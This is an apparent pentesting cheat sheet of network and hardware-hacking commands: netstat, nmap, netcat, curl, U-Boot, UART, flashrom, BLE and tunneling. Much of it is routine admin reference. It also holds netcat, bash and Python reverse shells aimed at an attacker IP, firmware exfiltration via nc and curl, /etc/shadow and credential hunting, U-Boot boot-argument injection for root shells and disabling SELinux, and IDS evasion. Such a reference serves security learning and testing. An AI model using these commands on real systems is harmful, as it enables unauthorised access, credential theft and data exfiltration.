---
title: "The Hacker's Cheat Sheet to Essential Network Commands"
date: "2024-11-03"
description: "A quick reference for vital network commands, UART boot args, and hardware hacking tools to elevate your security and pentesting skills."
tags: ["hackers", "network commands", "security tools", "uart", "hardware hacking"]
---

---

<h2 style="color: orange; text-align: center;">NETSTAT</h2>

### Basic Commands
```bash
netstat -a                   # Show all connections and listening ports
netstat -n                   # Display addresses/ports numerically
netstat -b                   # Show executable involved (Windows admin)
netstat -o                   # Display process IDs
```

### TCP / UDP
```bash
netstat -at                  # All active TCP connections
netstat -atnp                # TCP connections with process IDs
netstat -lt                  # Listening TCP ports
netstat -au                  # All active UDP connections
netstat -aunp                # UDP connections with process IDs
netstat -lu                  # Listening UDP ports
netstat -s -p tcp            # TCP protocol statistics
netstat -s -p udp            # UDP protocol statistics
```

### Security & Monitoring
```bash
netstat -antup               # All connections with processes
netstat -tlpn | grep LISTEN | grep -v "127.0.0.1"   # Suspicious listeners
netstat -ant | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head -10  # Port scan detection
netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n             # Connections per IP
netstat -ant | awk '{print $6}' | sort | uniq -c     # Connection state count
watch "netstat -an | grep ':80 '"                    # Watch port 80
watch -n1 'netstat -ant | grep -c ESTABLISHED'       # Watch established count
```

### Routing & Stats
```bash
netstat -rn                  # Numeric routing table
netstat -r                   # Routing table
netstat -i                   # Interface statistics
netstat -s                   # Protocol statistics
```

---

<h2 style="color: orange; text-align: center;">SS (Modern netstat replacement)</h2>

```bash
ss -tulpn                    # TCP/UDP listening ports with process names
ss -tnp                      # TCP connections with process info
ss -s                        # Socket summary statistics
ss -o state established      # All established connections
ss -lntp                     # Listening TCP ports numeric
ss -lnup                     # Listening UDP ports numeric
ss -tnp | grep ESTAB         # Only established TCP connections
ss -4                        # IPv4 only
ss -6                        # IPv6 only
ss dst 192.168.1.1           # Connections to a specific host
ss sport = :22               # Connections on source port 22
```

---

<h2 style="color: orange; text-align: center;">NMAP</h2>

### Host Discovery
```bash
nmap -sn 192.168.1.0/24      # Ping scan, no port scan
nmap -sn 192.168.1.0/24 --open  # Only show up hosts
nmap -PR 192.168.1.0/24      # ARP ping scan (local network)
nmap -Pn 192.168.1.1         # Skip ping, assume host is up
```

### Port Scanning
```bash
nmap 192.168.1.1             # Scan 1000 common ports
nmap -p- 192.168.1.1         # Scan all 65535 ports
nmap -p 22,80,443 192.168.1.1  # Scan specific ports
nmap -p 1-1000 192.168.1.1   # Scan port range
nmap -F 192.168.1.1          # Fast scan (100 ports)
nmap -sU 192.168.1.1         # UDP scan
nmap -sT 192.168.1.1         # TCP connect scan
nmap -sS 192.168.1.1         # SYN stealth scan (root)
```

### Service & OS Detection
```bash
nmap -sV 192.168.1.1         # Version detection
nmap -O 192.168.1.1          # OS detection
nmap -A 192.168.1.1          # Aggressive: OS + version + scripts + traceroute
nmap -sV --version-intensity 9 192.168.1.1  # Max version intensity
```

### Scripts (NSE)
```bash
nmap --script=default 192.168.1.1           # Default scripts
nmap --script=vuln 192.168.1.1              # Vulnerability scan
nmap --script=http-enum 192.168.1.1         # HTTP enumeration
nmap --script=smb-vuln* 192.168.1.1         # SMB vulnerabilities
nmap --script=ssl-enum-ciphers -p 443 192.168.1.1  # SSL cipher check
nmap --script=banner -p 21,22,23,80 192.168.1.1   # Banner grabbing
nmap --script=snmp-info -sU -p 161 192.168.1.1    # SNMP enumeration
nmap --script=ftp-anon -p 21 192.168.1.1          # FTP anonymous check
```

### Output & Evasion
```bash
nmap -oN output.txt 192.168.1.1    # Normal output
nmap -oX output.xml 192.168.1.1    # XML output
nmap -oG output.gnmap 192.168.1.1  # Grepable output
nmap -oA output 192.168.1.1        # All formats
nmap -f 192.168.1.1                # Fragment packets (IDS evasion)
nmap -D RND:5 192.168.1.1          # Decoy scan with 5 random IPs
nmap --source-port 53 192.168.1.1  # Spoof source port
nmap -T0 192.168.1.1               # Paranoid timing (slowest/stealthiest)
nmap -T5 192.168.1.1               # Insane timing (fastest)
```

---

<h2 style="color: orange; text-align: center;">NETCAT</h2>

### Basic
```bash
nc -l -p 4444                # Listen on TCP port 4444
nc -u -l -p 4444             # Listen on UDP port 4444
nc -v 192.168.1.1 80         # Connect to host port 80 (verbose)
nc -z -v 192.168.1.1 1-1000  # Port scan range 1-1000
```

### File Transfer
```bash
# Receiver
nc -l -p 4444 > received_file
# Sender
nc 192.168.1.1 4444 < file_to_send

# Tar over netcat
nc -l -p 4444 | tar xvf -                 # Receiver
tar cvf - /path/to/dir | nc 192.168.1.1 4444  # Sender
```

### Shells
```bash
# Reverse shell (victim runs this)
nc -e /bin/bash 192.168.1.100 4444
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1   # Bash reverse shell

# Bind shell (victim listens)
nc -l -p 4444 -e /bin/bash

# Listener (attacker)
nc -lvnp 4444
```

### Banner Grabbing
```bash
echo "" | nc -v -w1 192.168.1.1 22    # Grab SSH banner
echo "HEAD / HTTP/1.0\r\n" | nc 192.168.1.1 80   # HTTP banner
```

---

<h2 style="color: orange; text-align: center;">SCP</h2>

```bash
scp file.txt user@192.168.1.1:/path/             # Local → Remote
scp -r /local/dir user@192.168.1.1:/path/        # Directory → Remote
scp user@192.168.1.1:/path/file.txt .            # Remote → Local
scp -P 2222 file.txt user@192.168.1.1:/path/     # Custom port
scp -i key.pem file.txt user@192.168.1.1:/path/  # With identity file
scp -C file.txt user@192.168.1.1:/path/          # With compression
scp -v file.txt user@192.168.1.1:/path/          # Verbose debug
```

---

<h2 style="color: orange; text-align: center;">TCPDUMP</h2>

```bash
tcpdump -i eth0                          # Capture on interface eth0
tcpdump -i any                           # All interfaces
tcpdump -i eth0 -w capture.pcap         # Write to file
tcpdump -r capture.pcap                 # Read from file
tcpdump host 192.168.1.1                # Traffic to/from host
tcpdump src 192.168.1.1                 # Traffic FROM host
tcpdump dst 192.168.1.1                 # Traffic TO host
tcpdump port 80                         # HTTP traffic
tcpdump port 443                        # HTTPS traffic
tcpdump tcp                             # TCP only
tcpdump udp                             # UDP only
tcpdump not port 22                     # Exclude SSH
tcpdump -nn                             # No DNS resolution
tcpdump -A -i eth0 port 80              # ASCII output (useful for HTTP)
tcpdump -X -i eth0                      # Hex + ASCII output
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'   # SYN packets only
tcpdump -i eth0 'tcp[tcpflags] & (tcp-rst) != 0' # RST packets
tcpdump -i eth0 -c 100                  # Capture 100 packets then stop
tcpdump -i eth0 greater 1000            # Packets > 1000 bytes
tcpdump icmp                            # ICMP only (ping)
```

---

<h2 style="color: orange; text-align: center;">CURL</h2>

```bash
curl http://192.168.1.1                          # Basic GET
curl -v http://192.168.1.1                       # Verbose (headers)
curl -I http://192.168.1.1                       # HEAD request only
curl -X POST http://192.168.1.1/api              # POST request
curl -X POST -d "user=admin&pass=123" http://host/login  # POST with data
curl -H "Authorization: Bearer TOKEN" http://host/api    # Custom header
curl -u admin:password http://host/              # Basic auth
curl -k https://192.168.1.1                      # Ignore SSL errors
curl -L http://host                              # Follow redirects
curl -o file.bin http://host/file.bin            # Save to file
curl -O http://host/file.bin                     # Save with original name
curl --proxy http://127.0.0.1:8080 http://host   # Through proxy (Burp)
curl -b "session=abc123" http://host             # With cookie
curl -c cookies.txt http://host                  # Save cookies
curl --limit-rate 100k -O http://host/large.bin  # Rate limit download
curl -s http://host | grep -i password           # Silent + grep
```

---

<h2 style="color: orange; text-align: center;">WGET</h2>

```bash
wget http://host/file.bin                # Download file
wget -r http://host/                     # Recursive download (mirror)
wget -q http://host/file.bin             # Quiet mode
wget -b http://host/largefile.bin        # Background download
wget -c http://host/file.bin             # Resume incomplete download
wget --no-check-certificate https://host # Ignore SSL
wget -O custom_name.bin http://host/file # Custom filename
wget -i urls.txt                         # Download from URL list
wget -m -p --convert-links http://host   # Mirror full site
```

---

<h2 style="color: orange; text-align: center;">SSH</h2>

```bash
ssh user@192.168.1.1                     # Basic SSH
ssh -p 2222 user@192.168.1.1            # Custom port
ssh -i key.pem user@192.168.1.1         # With private key
ssh -v user@192.168.1.1                 # Verbose debug
ssh -L 8080:localhost:80 user@host      # Local port forward (access remote:80 via localhost:8080)
ssh -R 4444:localhost:22 user@host      # Remote port forward (reverse tunnel)
ssh -D 9050 user@host                   # SOCKS5 proxy (use with proxychains)
ssh -N -f -L 8080:localhost:80 user@host  # Background tunnel, no shell
ssh -o StrictHostKeyChecking=no user@host # Skip host key check
ssh-keygen -t rsa -b 4096               # Generate SSH key pair
ssh-copy-id user@192.168.1.1            # Copy public key to remote
```

---

<h2 style="color: orange; text-align: center;">DNS TOOLS</h2>

```bash
# dig
dig google.com                           # Basic DNS lookup
dig google.com ANY                       # All record types
dig google.com MX                        # MX records
dig google.com NS                        # Name servers
dig @8.8.8.8 google.com                  # Query specific DNS server
dig -x 8.8.8.8                          # Reverse DNS lookup
dig +trace google.com                    # Trace DNS resolution path
dig axfr @ns1.host.com domain.com        # Zone transfer attempt

# nslookup
nslookup google.com                      # Basic lookup
nslookup 8.8.8.8                         # Reverse lookup
nslookup -type=MX google.com             # MX records

# host
host google.com                          # Quick lookup
host -t MX google.com                    # MX records
host 8.8.8.8                             # Reverse lookup
```

---

<h2 style="color: orange; text-align: center;">ARP / IP TOOLS</h2>

```bash
arp -a                                   # Show ARP cache
arp -n                                   # Numeric ARP cache
arp -d 192.168.1.1                       # Delete ARP entry

ip addr                                  # Show all interfaces and IPs
ip addr show eth0                        # Show specific interface
ip route                                 # Show routing table
ip route add 10.0.0.0/8 via 192.168.1.1 # Add static route
ip neigh                                 # Show ARP table (modern)
ip link show                             # Show link layer info
ip -s link show eth0                     # Interface statistics

ifconfig -a                              # All interfaces (classic)
ifconfig eth0 192.168.1.100 up           # Set IP on interface
```

---

<h2 style="color: orange; text-align: center;">MASSCAN</h2>

```bash
masscan 192.168.1.0/24 -p80              # Fast HTTP scan
masscan 192.168.1.0/24 -p0-65535        # All ports
masscan 192.168.1.0/24 -p80,443,22      # Multiple ports
masscan 10.0.0.0/8 -p80 --rate=10000    # Rate-limited scan
masscan -iL hosts.txt -p22              # From host list
masscan 192.168.1.0/24 -p80 -oG out.txt # Grepable output
```

---

<h2 style="color: orange; text-align: center;">OPENSSL</h2>

```bash
openssl s_client -connect host:443                  # SSL handshake info
openssl s_client -connect host:443 -tls1            # Force TLS 1.0
openssl s_client -connect host:443 -tls1_2          # Force TLS 1.2
openssl s_client -connect host:443 </dev/null 2>&1 | grep -i "cipher\|subject\|issuer"
openssl x509 -in cert.pem -text -noout             # Parse certificate
openssl genrsa -out key.pem 2048                    # Generate RSA key
openssl req -new -x509 -key key.pem -out cert.pem  # Self-signed cert
openssl enc -aes-256-cbc -in file -out file.enc     # Encrypt file
openssl enc -d -aes-256-cbc -in file.enc -out file  # Decrypt file
openssl md5 file.bin                                # MD5 hash
openssl sha256 file.bin                             # SHA256 hash
```

---

<h2 style="color: orange; text-align: center;">UART / SERIAL TOOLS</h2>

```bash
# Connect to UART
screen /dev/ttyUSB0 115200              # Basic serial connect
minicom -D /dev/ttyUSB0 -b 115200       # minicom
picocom -b 115200 /dev/ttyUSB0          # picocom
cu -l /dev/ttyUSB0 -s 115200            # cu
stty -F /dev/ttyUSB0 115200 raw -echo && cat /dev/ttyUSB0  # Raw mode

# Baud rate bruteforce
for baud in 300 600 1200 2400 4800 9600 14400 19200 38400 57600 115200 230400 460800 921600; do
  echo "Trying $baud"; stty -F /dev/ttyUSB0 $baud; sleep 1; done

# Dump firmware via UART shell
cat /proc/mtd                           # List MTD partitions
dd if=/dev/mtd0 of=/tmp/fw.bin          # Dump MTD partition
dd if=/dev/mtdblock0 of=/tmp/boot.bin   # Dump via block device
cat /dev/mtd0 > /tmp/fw.bin             # Alternative dump

# List ports
ls /dev/tty*                            # All TTY devices
ls /dev/ttyUSB*                         # USB serial adapters
ls /dev/ttyS*                           # Hardware serial ports
dmesg | grep -i "tty\|uart\|serial\|ch34\|cp210\|ft232"  # Detect adapter
```

---

<h2 style="color: orange; text-align: center;">U-BOOT BOOT ARGS (UART)</h2>

### Essential U-Boot Commands
```bash
# Environment
printenv                     # Print all environment variables
printenv bootargs            # Print current boot arguments
setenv bootargs <args>       # Set boot arguments
saveenv                      # Save environment to flash

# Boot
boot                         # Boot with current config
bootm                        # Boot application image from memory
bootz                        # Boot zImage kernel
booti                        # Boot Image from memory (ARM64)
run bootcmd                  # Run the bootcmd variable

# Memory
md 0x80000000 100            # Memory display (hex dump at address)
mw 0x80000000 0x00 100       # Memory write (fill with zeros)
mm 0x80000000                # Memory modify interactively
cp.b 0x80000000 0x81000000 0x100  # Copy memory

# Flash / MTD
nand read 0x80000000 0x0 0x400000   # Read NAND to RAM
nand write 0x80000000 0x0 0x400000  # Write RAM to NAND
nand erase 0x0 0x400000             # Erase NAND region
sf probe                             # Init SPI flash
sf read 0x80000000 0x0 0x400000     # Read SPI flash to RAM
sf write 0x80000000 0x0 0x400000    # Write RAM to SPI flash
sf erase 0x0 0x400000               # Erase SPI flash region

# Network
dhcp                         # Get IP via DHCP
ping 192.168.1.1             # Ping from U-Boot
tftpboot 0x80000000 firmware.bin  # Download firmware via TFTP

# System Info
version                      # U-Boot version
bdinfo                       # Board info
coninfo                      # Console device info
```

### Boot Argument Injection (Attack Techniques)

#### Get root shell via init override
```bash
# In U-Boot prompt - append to existing bootargs:
setenv bootargs "${bootargs} init=/bin/sh"
boot

# Alternative single-user mode
setenv bootargs "${bootargs} single"
setenv bootargs "${bootargs} init=/bin/bash"
setenv bootargs "${bootargs} rdinit=/bin/sh"
```

#### Disable read-only rootfs
```bash
setenv bootargs "${bootargs} rw"
# or override completely:
setenv bootargs "console=ttyS0,115200 root=/dev/mtdblock2 rw init=/bin/sh"
```

#### Common bootargs structures
```bash
# Minimal Linux boot
setenv bootargs "console=ttyS0,115200n8 root=/dev/mtdblock2 rootfstype=squashfs"

# NAND boot
setenv bootargs "console=ttyS0,115200 ubi.mtd=3 root=ubi0:rootfs rootfstype=ubifs"

# NFS boot (load rootfs over network)
setenv bootargs "console=ttyS0,115200 root=/dev/nfs nfsroot=192.168.1.100:/nfsroot ip=dhcp"

# Disable kernel security features
setenv bootargs "${bootargs} nokaslr selinux=0 enforcing=0 loglevel=8"

# Enable debug output
setenv bootargs "${bootargs} loglevel=8 debug ignore_loglevel"

# Bypass secure boot check (device-specific)
setenv bootargs "${bootargs} androidboot.verifiedbootstate=orange"
```

#### Full rootfs replacement via TFTP
```bash
# 1. Start TFTP server with modified rootfs
# 2. In U-Boot:
setenv ipaddr 192.168.1.10
setenv serverip 192.168.1.100
tftpboot 0x82000000 rootfs.squashfs
sf erase 0x200000 0x600000
sf write 0x82000000 0x200000 ${filesize}
```

#### Interrupt autoboot
```bash
# Hit any key during "Hit any key to stop autoboot: 3" countdown
# Common interrupt strings: Space, Enter, Ctrl+C, s, any key
# Some devices use a specific key - check "Stop autoboot keyed" in printenv

# If autoboot can't be interrupted, short the boot pins or glitch
```

#### Useful U-Boot one-liners for recon
```bash
# Find filesystem offset in flash
nand dump 0x0                           # Dump first NAND page
md.b 0x80000000 0x80                    # Hex dump memory

# Search for filesystem signatures in flash
nand read 0x80000000 0x0 0x2000000      # Load 32MB to RAM
md.b 0x80000000                         # Dump and look for: 68737173 (squashfs), 1985 (jffs2)

# Dump U-Boot environment partition
nand read 0x80000000 0x40000 0x20000
md.b 0x80000000 200
```

---

<h2 style="color: orange; text-align: center;">LINUX POST-EXPLOITATION (Embedded / IoT)</h2>

```bash
# Initial recon after UART shell access
id                           # Who am I?
uname -a                     # Kernel version and architecture
cat /proc/version            # Kernel build info
cat /proc/cpuinfo            # CPU info
cat /proc/meminfo            # Memory info
cat /proc/mtd                # MTD partition layout
cat /proc/mounts             # Mounted filesystems
df -h                        # Disk usage
ls /dev/mtd*                 # MTD device list
ls /dev/tty*                 # Serial devices

# Firmware extraction
dd if=/dev/mtd0 of=/tmp/uboot.bin    # U-Boot
dd if=/dev/mtd1 of=/tmp/kernel.bin   # Kernel
dd if=/dev/mtd2 of=/tmp/rootfs.bin   # Rootfs
dd if=/dev/sda of=/tmp/full.bin      # Full storage dump

# Transfer out
cat /tmp/fw.bin | nc 192.168.1.100 4444     # Via netcat
scp /tmp/fw.bin user@192.168.1.100:/tmp/    # Via SCP
tftp -p -r fw.bin 192.168.1.100             # Via TFTP
curl -F "file=@/tmp/fw.bin" http://192.168.1.100:8080/upload  # Via HTTP

# Credentials hunting
cat /etc/passwd
cat /etc/shadow
cat /etc/config/system                       # OpenWrt config
grep -r "password\|passwd\|secret\|key\|token" /etc/ 2>/dev/null
grep -r "admin\|root\|default" /etc/ 2>/dev/null
find / -name "*.conf" -o -name "*.cfg" 2>/dev/null | xargs grep -l "pass"

# Process and network recon
ps                           # Running processes
ps aux                       # Detailed processes
netstat -tlnp                # Listening services
iptables -L                  # Firewall rules
cat /etc/hosts               # Hosts file
```

---

<h2 style="color: orange; text-align: center;">FLASHROM (SPI Flash)</h2>

```bash
# Detect chip
flashrom -p buspirate_spi:dev=/dev/ttyUSB0
flashrom -p ch341a_spi

# Read firmware
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r firmware.bin
flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -c W25Q32 -r fw.bin
flashrom -p ch341a_spi -r firmware.bin

# Write firmware
flashrom -p ch341a_spi -w modified_firmware.bin
flashrom -p ch341a_spi -c W25Q64 -w firmware.bin

# Verify
flashrom -p ch341a_spi -v firmware.bin

# Erase
flashrom -p ch341a_spi -E
```

---

<h2 style="color: orange; text-align: center;">BINWALK</h2>

```bash
binwalk firmware.bin                     # Scan for signatures
binwalk -e firmware.bin                  # Extract everything
binwalk -Me firmware.bin                 # Recursive extraction
binwalk -E firmware.bin                  # Entropy analysis (detect encryption)
binwalk -A firmware.bin                  # Disassemble code (opcode scan)
binwalk -Y firmware.bin                  # Identify CPU architecture
binwalk -W firmware1.bin firmware2.bin   # Diff two firmware files
binwalk --dd='.*' firmware.bin           # Extract all matched signatures
binwalk -l 1024 firmware.bin             # Limit scan length
binwalk -o 0x10000 firmware.bin          # Start scan at offset
strings firmware.bin | grep -i "password\|admin\|secret\|192.168"
```

---

<h2 style="color: orange; text-align: center;">OPENOCD / JTAG</h2>

```bash
# Connect via JTAG
openocd -f interface/jlink.cfg -f target/stm32f1x.cfg
openocd -f interface/raspberrypi-native.cfg -f target/esp32.cfg

# OpenOCD telnet commands (after connecting on port 4444)
halt                         # Halt CPU
resume                       # Resume execution
reset halt                   # Reset and halt
step                         # Single step
dump_image firmware.bin 0x0 0x100000    # Dump flash to file
load_image firmware.bin 0x0             # Flash image
mdw 0x08000000 32            # Read 32 words from address
mww 0x20000000 0xdeadbeef    # Write word to address
```

---

<h2 style="color: orange; text-align: center;">BLUETOOTH / BLE TOOLS</h2>

```bash
# Scan
hcitool scan                             # Classic BT scan
hcitool lescan                           # BLE scan
bluetoothctl scan on                     # Interactive scan

# GATT
gatttool -b AA:BB:CC:DD:EE:FF -I        # Interactive GATT
  > connect
  > primary                              # List services
  > characteristics                      # List characteristics
  > char-read-hnd 0x0010                 # Read handle
  > char-write-req 0x0012 deadbeef       # Write to handle

# BLE tools
sudo bleak-lescan                        # Python Bleak BLE scan
btlejuice-proxy -u AA:BB:CC:DD:EE:FF    # BLE MITM proxy

# SDP (Classic BT)
sdptool browse --tree --raw AA:BB:CC:DD:EE:FF
```

---

<h2 style="color: orange; text-align: center;">PROXYCHAINS / TUNNELING</h2>

```bash
# Proxychains (route tools through SOCKS proxy)
proxychains nmap -sT 10.0.0.1           # Nmap through proxy
proxychains curl http://internal.host   # Curl through proxy
proxychains ssh user@internal.host      # SSH through proxy

# Edit /etc/proxychains.conf:
# socks5 127.0.0.1 9050  ← Tor
# socks5 127.0.0.1 1080  ← SSH tunnel

# SSH SOCKS proxy setup
ssh -D 9050 -N -f user@jumphost         # Create SOCKS5 proxy on 9050

# Chisel (HTTP tunneling)
# Server (attacker):
chisel server -p 8080 --reverse
# Client (victim):
chisel client 192.168.1.100:8080 R:4444:127.0.0.1:22
```

---

<h2 style="color: orange; text-align: center;">MISC USEFUL COMMANDS</h2>

```bash
# Find SUID binaries (privilege escalation)
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -perm -2 -type f 2>/dev/null

# Cron jobs
crontab -l
cat /etc/crontab
ls /etc/cron.*

# Active services
systemctl list-units --type=service --state=running
service --status-all

# Bash reverse shell (no netcat)
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Python reverse shell
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

# Upgrade shell to full TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → reset

# File transfer via base64 (no tools needed)
base64 file.bin | tr -d '\n'            # Encode on target
echo "BASE64_STRING" | base64 -d > file.bin  # Decode on attacker

# Search for interesting files
find / -name "*.conf" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name ".ssh" -type d 2>/dev/null
find / -name "*.log" 2>/dev/null | head -20
```
